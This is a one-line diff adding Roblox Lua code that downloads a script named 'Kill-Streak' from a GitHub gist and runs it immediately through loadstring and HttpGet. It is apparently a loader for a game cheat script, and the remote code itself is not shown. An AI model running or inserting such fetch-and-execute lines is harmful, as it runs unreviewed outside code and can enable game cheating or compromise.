@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/ServerSad/dfa98499e8f7999ad2cee4fad8aa6439/raw/f914415c794b262ad818a8ebd1dacd1603ae2c1a/Kill-Streak"))()
